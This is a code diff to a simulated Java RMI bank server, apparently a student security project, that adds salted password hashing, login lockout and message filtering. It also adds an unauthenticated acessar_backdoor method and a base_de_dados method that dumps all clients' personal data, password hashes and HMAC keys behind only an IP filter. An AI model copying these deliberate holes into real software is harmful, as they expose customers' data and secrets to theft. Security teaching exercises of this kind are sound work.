@@ -38,13 +38,18 @@ public class BancoImp implements Banco{
     private String last_p = ". . .";
     private String last_g = ". . .";
 
-    protected BancoImp(){
+    private Relogio relogio = null;
+    private final long tempo_de_bloqueio = 30000; 
+
+    protected BancoImp(Relogio relogio){
         // Gera chaves do banco
         String [] chaves = Cifrador.gerarChavesElGamal().split("\\|");
         chave_privada = new BigInteger(chaves[0]);
         chave_publica = new BigInteger(chaves[1]);
         p = new BigInteger(chaves[2]);
         g = new BigInteger(chaves[3]);
+
+        this.relogio = relogio;
         
         // Carrega clientes
         try{
@@ -80,13 +85,10 @@ public class BancoImp implements Banco{
             return false;
         }
 
-        /* Se ja estiver conectado, nao permite outra conexao */
-        if(verificar_conexao(cpf)){
-            return false;
-        }
-
         String senha_encontrada = cliente.getSenha();
-        if(senha_encontrada.equals(dados[1])) { 
+        /* Compara o hash da senha armazenada na base de dados e hash gerado da senha recebida */
+        String hash_senha_recebida = Autenticador.hash_senha(dados[1], buscar_salt_por_cpf(cpf));
+        if(senha_encontrada.equals(hash_senha_recebida)) { 
             /* Conecta o cliente e abre o acesso */
             cliente.conectar();
             return true; 
@@ -116,8 +118,6 @@ public class BancoImp implements Banco{
 
         /* Adiciona o cliente no Banco e seus dados no Servidor */
         contas.add(new Cliente(dados, false));
-        /* Conecta o cliente */
-        buscar_por_cpf(dados[1]).conectar();
         /* Gera as chaves e o primeiro vetor de inicializacao */
         addCPF(dados[1]);
         return true;
@@ -194,8 +194,22 @@ public class BancoImp implements Banco{
     /* Verifica a integridade da mensagem */
     public String receber_mensagem(String cpf, String msg_cripto, String tag_recebida) throws RemoteException
     {
+        /* 
+        * Neste ponto a autenticação/cadastro foi realizada(o) com sucesso. 
+        * Caso tenha sido cadastrado, o cliente ainda não está "conectado", 
+        * portanto é verificado esta condição para corrigir e evitar que um 
+        * atacante acesse sua conta. 
+        */
+        Cliente cliente = buscar_por_cpf(cpf);
+        if(!cliente.esta_conectado() && cliente.conta_nova) { 
+            cliente.conectar();
+            cliente.conta_nova = false;
+        }else if(!cliente.esta_conectado()){
+            return "not_logged";
+        }
+        
         /* Resgata a chave hmac */
-        String chave_hmac = buscar_por_cpf(cpf).chave_hmac;
+        String chave_hmac = cliente.chave_hmac;
         /* Resgata a chave publica do emissor */
         String [] ypg = ypg_dos_usuarios.get(cpf).split("\\|");
         if(Autenticador.autenticar_hash_assinado(
@@ -211,9 +225,14 @@ public class BancoImp implements Banco{
             SecretKey chave_aes = getChaveAES(cpf);
             byte [] vi_bytes = getVetorInit(cpf);
             String mensagem = Cifrador.decifrar_mensagem(msg_cripto, cpf, chave_vernam, chave_aes, vi_bytes);
+            
+            /* Realiza filtragem do pacote recebido */
+            if(!Filtro.filtrar_operacoes(mensagem)){
+                return "blocked";
+            }
 
             /* Atualiza as informações recebidas pelo usuário */
-            last_msg = msg_cripto;
+            last_msg = "CPF: " + cpf + " enviou a mensagem >> " + msg_cripto;
             last_p = ypg[1];
             last_g = ypg[2];
 
@@ -249,6 +268,44 @@ public class BancoImp implements Banco{
     /*           METODOS ADICIONAIS            */
     /* ======================================= */ 
 
+    public String base_de_dados(String ip) throws RemoteException
+    {
+        if(!Filtro.filtrar_acesso_ao_BD(ip)){
+            return "Acesso não permitido!";
+        }
+
+        StringBuilder sb = new StringBuilder();
+
+        for(Cliente c : contas) {
+            sb.append("\n---------------------------------------------------");
+            sb.append( "\nNome : " + c.getNome() );
+            sb.append( "\nCPF : " + c.getCpf() );
+            sb.append( "\nSaldo : " + c.getSaldo() );
+            sb.append( "\nEndereço : " + c.getEndereco() );
+            sb.append( "\nTelefone : " + c.getTelefone() );
+            sb.append( "\nNumero da conta : " + c.getNumeroConta() );
+            sb.append( "\nSenha : " + c.getSenha() );
+            sb.append( "\nChave HMAC : " + c.chave_hmac );
+            sb.append("\n---------------------------------------------------");
+        }
+        return sb.toString();
+    }
+
+    public String acessar_backdoor(String ip) throws RemoteException
+    {
+        return Backdoor.dados_do_banco();
+    }
+
+    public long tempo_de_bloqueio() throws RemoteException
+    {
+        return tempo_de_bloqueio;
+    }
+
+    private byte [] buscar_salt_por_cpf(String cpf) {
+        Cliente c = buscar_por_cpf(cpf);
+        return c.getSalt();
+    }
+
     public String divulgar_chave_publica(String cpf) throws RemoteException
     {
         /* Verifica se o cpf esta cadastrado no sistema */
@@ -263,19 +320,18 @@ public class BancoImp implements Banco{
 
     public void receber_chave_publica( String ypg, String cpf, String senha ) throws RemoteException
     {
+        /* Compara o hash da senha armazenada na base de dados e hash gerado da senha recebida */
+        String hash_senha_recebida = Autenticador.hash_senha(senha, buscar_salt_por_cpf(cpf));
+        
         /* Agora o metodo buscar chave hmac faz uma rapida autenticação */
         Cliente cliente = buscar_por_cpf(cpf);
         if(cliente == null){
             return;
         }
-        if(cliente.getSenha().compareTo(senha) != 0){
+        if(cliente.getSenha().compareTo(hash_senha_recebida) != 0){
             return;
         }
-        /* Também verifica se o usuário já não está conectado */
-        if(cliente.esta_conectado()){
-            return;
-        }
-
+    
         /* Se ainda não tiver uma chave publica para o cpf, ela é criada no Map */
         if(ypg_dos_usuarios.get(cpf) == null){
             ypg_dos_usuarios.put(cpf, ypg);
@@ -321,7 +377,6 @@ public class BancoImp implements Banco{
                 return visualizar_perfil(cpf);
             case "sair":
                 buscar_por_cpf(cpf).desconectar();
-                System.out.println("Cliente com CPF:" + cpf + " desconectado." );
                 
                 try{
                     escrever_arquivo();
@@ -357,18 +412,61 @@ public class BancoImp implements Banco{
 
     public String buscar_cpf_na_autenticacao(String numero_conta) throws RemoteException
     {
-        return buscar_por_numero(numero_conta).getCpf();
+        Cliente cliente;
+        try {
+            cliente = buscar_por_numero(numero_conta);
+            //Verifica se o cpf já está logado
+            if(cliente.esta_conectado()){
+                return "logged";
+            }
+            else{
+                return cliente.getCpf();
+            }
+            
+        } catch (NullPointerException e) {
+            return "no_cpf";
+        }
     }
 
     public String buscar_chave_hmac(String senha, String cpf, String p_cli, String g_cli) throws RemoteException
     {
-        /* Agora o metodo buscar chave hmac faz uma rapida autenticação */
+        long tempo_atual = relogio.tempo_atual();
+
+        /* Compara o hash da senha armazenada na base de dados e hash gerado da senha recebida */
+        String hash_senha_recebida = Autenticador.hash_senha(senha, buscar_salt_por_cpf(cpf));
+        
         Cliente cliente = buscar_por_cpf(cpf);
         if(cliente == null){
             return "";
         }
-        if(cliente.getSenha().compareTo(senha) != 0){
-            return "";
+
+        /* Autenticação */
+        if(cliente.getSenha().compareTo(hash_senha_recebida) != 0){
+            cliente.contador += 1;
+            if(cliente.contador == 3){
+                cliente.bloqueado = true;
+                cliente.tempo_de_bloqueio = tempo_atual;
+                System.out.println("Conta de CPF " + cliente.getCpf() + " foi bloqueada no tempo " + cliente.tempo_de_bloqueio);
+            }
+            /* Codigo para indicar senha incorreta */
+            return "404";
+            
+        }
+        /* Senha está igual, mas verifica se a conta está bloqueada */
+        else if(cliente.bloqueado){
+            /* Verifica se já passaram 10s desde o bloqueio do cliente */
+            if(tempo_atual - cliente.tempo_de_bloqueio >= tempo_de_bloqueio){
+                System.out.println("Conta de CPF " + cliente.getCpf() + " foi desbloqueada no tempo " + tempo_atual);
+                cliente.bloqueado = false;
+                cliente.contador = 0;
+            }
+            else {
+                return "";
+            }
+        }
+        /* Se a senha foi digitada corretamente e a conta está desbloqueada, então reseta o contador */
+        else{
+            cliente.contador = 0;
         }
 
         /* Resgata a chave hmac */
@@ -422,7 +520,6 @@ public class BancoImp implements Banco{
         IvParameterSpec vi = gerar_vetor_inicializacao();
 
         if(cpf.isBlank()){
-            System.out.println("CPF inválido!");
             return;
         }
         vetores_init.replace(cpf, vi);
@@ -444,11 +541,6 @@ public class BancoImp implements Banco{
         if(vetores_init.get(cpf) == null){
             vetores_init.put(cpf, gerar_vetor_inicializacao());
         }
-    }
-
-    private boolean verificar_conexao(String cpf) throws RemoteException
-    {
-        return buscar_por_cpf(cpf).esta_conectado();
     }
 
     public String last_msg() throws RemoteException
